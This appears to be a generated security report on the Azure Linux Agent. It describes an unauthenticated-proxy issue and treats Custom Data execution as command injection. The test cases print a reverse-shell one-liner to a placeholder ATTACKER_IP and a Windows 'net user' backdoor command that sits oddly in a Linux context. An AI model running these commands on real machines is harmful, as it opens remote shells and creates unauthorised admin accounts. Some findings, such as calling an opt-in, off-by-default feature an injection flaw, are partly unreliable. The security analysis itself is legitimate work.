## Combined Vulnerability List

### Vulnerability: Unauthenticated HTTP Proxy Usage in VM Extensions
- Description:
  1. The Azure Linux Agent supports using an HTTP proxy defined by environment variables (`http_proxy`, `https_proxy`) or configuration variables (`HttpProxy.Host`, `HttpProxy.Port`).
  2. The agent passes these proxy settings to VM Extensions.
  3. The agent documentation explicitly states that "the agent *does not* support HTTP proxies requiring authentication."
  4. If an attacker can control the environment variables or manipulate the agent's configuration (preconditions), they can force VM Extensions to use a malicious proxy.
  5. This malicious proxy can intercept and potentially modify requests made by VM Extensions, including sensitive data being transmitted by extensions.
  6. Step by step trigger:
     - Attacker gains control or influence over the VM's environment variables (e.g., through a separate vulnerability or misconfiguration).
     - Attacker sets `http_proxy` or `https_proxy` to point to their malicious proxy server.
     - A VM Extension, configured to use the proxy settings from the agent, makes an HTTP/HTTPS request.
     - The request is routed through the attacker's proxy server, allowing interception and potential modification of the request and response.
- Impact:
  - Information Disclosure: Sensitive data transmitted by VM Extensions can be intercepted by the malicious proxy.
  - Data Manipulation: An attacker could potentially modify requests or responses, leading to unexpected behavior or security breaches within the VM.
  - Privilege Escalation (potentially): Depending on the extension's functionality and the attacker's ability to manipulate requests, this could potentially lead to privilege escalation within the VM.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
  - None specific to authentication for proxies. The documentation only warns against using authenticated proxies.
- Missing Mitigations:
  - Implement support for authenticated HTTP proxies.
  - Provide clear guidance and warnings in documentation against using unauthenticated proxies, especially in production environments.
  - Consider restricting the usage of proxy settings within extensions or providing a mechanism for extensions to securely configure their proxy settings, independent of the agent's configuration.
- Preconditions:
  - Attacker's ability to set environment variables within the VM or modify the agent's configuration file `/etc/waagent.conf`.
  - VM Extensions are configured to use the agent's proxy settings (this is the default behavior).
- Source Code Analysis:
  - The `README.md` file documents the HTTP Proxy functionality and explicitly mentions the lack of authentication support:
    ```markdown
    ### HTTP Proxy
    The Agent will use an HTTP proxy if provided via the `http_proxy` (for `http` requests) or
    `https_proxy` (for `https` requests) environment variables. Due to limitations of Python,
    the agent *does not* support HTTP proxies requiring authentication.
    ...
    The Agent passes its environment to the VM Extensions it executes, including `http_proxy` and `https_proxy`, so defining
    a proxy for the Agent will also define it for the VM Extensions.
    ```
  - The code itself (Python) would need to be analyzed to confirm how proxy settings are handled and passed to extensions, but the documentation clearly states the vulnerability. Based on the provided files `exthandlers.py` and `cgroupconfigurator.py`, there's no indication of changes or mitigations for this vulnerability. The files are primarily focused on extension lifecycle management and cgroup configuration, respectively.
- Security Test Case:
  1. Set up a malicious HTTP proxy server that logs all requests and responses.
  2. On an Azure VM running the Linux Agent, set the environment variable `http_proxy` (or `https_proxy`) to point to the malicious proxy server's address. This can be done by modifying the Agent's service configuration (e.g., `/etc/systemd/system/walinuxagent.service.d/http-proxy.conf` on systemd-based systems).
  3. Deploy a VM Extension that makes an HTTP/HTTPS request (any extension making network calls will suffice; a simple test extension could be created for this purpose).
  4. Observe the logs of the malicious proxy server to confirm that the VM Extension's request was routed through it.
  5. (Optional) Modify the malicious proxy to alter the response from the intended destination and observe the behavior of the VM Extension to verify data manipulation is possible.

### Vulnerability: Command Injection via Custom Data
- Description:
    1. The Azure Linux Agent configuration file (`/etc/waagent.conf`) contains options `Provisioning.DecodeCustomData` and `Provisioning.ExecuteCustomData`.
    2. If `Provisioning.ExecuteCustomData` is set to 'y', the agent attempts to execute the Custom Data provided during VM provisioning.
    3. If `Provisioning.DecodeCustomData` is also enabled (set to 'y'), the agent decodes the Custom Data from Base64 before execution.
    4. If an attacker can control or manipulate the Custom Data (e.g., through a compromised Azure account or by intercepting provisioning data if HTTP is allowed), they can inject malicious commands into the Custom Data.
    5. When the agent executes this manipulated Custom Data, it will execute the attacker's commands as root, leading to arbitrary code execution.
- Impact:
    - Full system compromise: Successful exploitation allows an attacker to execute arbitrary code with root privileges on the virtual machine.
    - Data breach: Attackers can gain access to sensitive data stored on the VM.
    - System takeover: Attackers can take complete control of the VM, potentially using it for further malicious activities like botnet participation or lateral movement within Azure infrastructure.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - None: Based on the provided files, there are no explicit sanitization or security checks implemented in the agent code to prevent command injection when executing Custom Data. The configuration options themselves are described in `/code/README.md`, but they are presented as features, not as potential risks with mitigations.
- Missing Mitigations:
    - Input sanitization: The agent should sanitize Custom Data to remove or escape any potentially harmful characters or commands before execution.
    - Sandboxing or secure execution environment: Instead of directly executing Custom Data in a shell, the agent could use a sandboxed environment or a more secure execution method to limit the potential impact of malicious code.
    - Disable by default: `Provisioning.ExecuteCustomData` should be disabled by default to minimize the attack surface. Users who require this functionality should be clearly warned about the security implications and instructed on how to enable it securely.
    - Principle of least privilege: The agent should avoid executing Custom Data as root. If root privileges are absolutely necessary, consider dropping privileges after minimal required operations.
- Preconditions:
    1. `Provisioning.ExecuteCustomData` is enabled in `/etc/waagent.conf` (or the configuration file being used).
    2. Optionally, `Provisioning.DecodeCustomData` is enabled if the attacker wants to provide Base64 encoded commands.
    3. An attacker has the ability to manipulate the Custom Data provided to the VM during provisioning. This could be achieved through compromising Azure accounts, man-in-the-middle attacks (if HTTP is enabled), or other means of intercepting or modifying VM provisioning data.
- Source Code Analysis:
    1. **File: /code/README.md**: This file describes the configuration options, including `Provisioning.ExecuteCustomData` and `Provisioning.DecodeCustomData`. It mentions their functionality but doesn't highlight any security considerations or mitigations.

    ```markdown
    #### __Provisioning.DecodeCustomData__
    _Type: Boolean_
    _Default: n_

    If set, waagent will decode CustomData from Base64.

    #### __Provisioning.ExecuteCustomData__
    _Type: Boolean_
    _Default: n_

    If set, waagent will execute CustomData after provisioning.
    ```

    2. **File: /code/azurelinuxagent/agent.py**:  While this file is the main agent entry point, the actual Custom Data execution logic is likely in the provisioning modules. Further analysis of the provisioning code is needed in subsequent steps (not in the provided PROJECT FILES).

    ```python
    # ... (Snippet from README.md indicates that waagent.conf controls actions)
    A configuration file (/etc/waagent.conf) controls the actions of waagent.
    ...
    ```

    3. **Configuration samples in /code/README.md**: The sample configuration shows that `Provisioning.ExecuteCustomData` is set to 'n' by default, which is a good security practice, but users can enable it.

    ```yml
    Provisioning.DecodeCustomData=n
    Provisioning.ExecuteCustomData=n
    ```

    **Visualization:**

    ```mermaid
    graph LR
        A[Attacker Manipulates Custom Data] --> B{Provisioning.ExecuteCustomData=y?};
        B -- Yes --> C{Provisioning.DecodeCustomData=y?};
        B -- No --> F[Agent Ignores Custom Data];
        C -- Yes --> D[Agent Decodes Custom Data (Base64)];
        C -- No --> E[Agent Uses Custom Data As Is];
        D --> G[Agent Executes Custom Data as Root];
        E --> G;
        G --> H[Arbitrary Code Execution as Root];
    ```

- Security Test Case:
    1. **Pre-requisites:**
        - Deploy an Azure Linux VM instance.
        - Ensure that `Provisioning.ExecuteCustomData=y` is set in `/etc/waagent.conf` on the VM. You can achieve this by creating a custom image with this setting or using a Custom Script Extension to modify the configuration file during VM creation.
        - Ensure that `Provisioning.DecodeCustomData=y` is set in `/etc/waagent.conf` on the VM (optional, but recommended for a more realistic test).
    2. **Attack Simulation:**
        - As an attacker, craft a Custom Data payload that contains a malicious command. For example, to create a backdoor user:

        ```bash
        echo 'net user attacker P@$$wOrd123! /add && net localgroup administrators attacker /add' | base64
        ```
        - For Linux, a simple reverse shell can be used:
        ```bash
        echo 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' | base64
        ```
        Replace `ATTACKER_IP` and `ATTACKER_PORT` with the attacker's listening IP and port.

        - When creating the VM (either through Azure Portal, CLI, or ARM template), provide this crafted Base64 encoded string (or plain text command if `Provisioning.DecodeCustomData=n`) as the Custom Data for the VM.
    3. **Verification:**
        - After the VM is provisioned and the agent has processed the Custom Data, attempt to connect to the VM using the backdoor account (if using the `net user` example) or check for a reverse shell connection on the attacker's listening port (if using the reverse shell example).
        - Check `/var/log/waagent.log` to confirm that Custom Data execution was attempted and if any errors occurred.
        - If the test is successful, the attacker will have achieved arbitrary code execution on the VM.
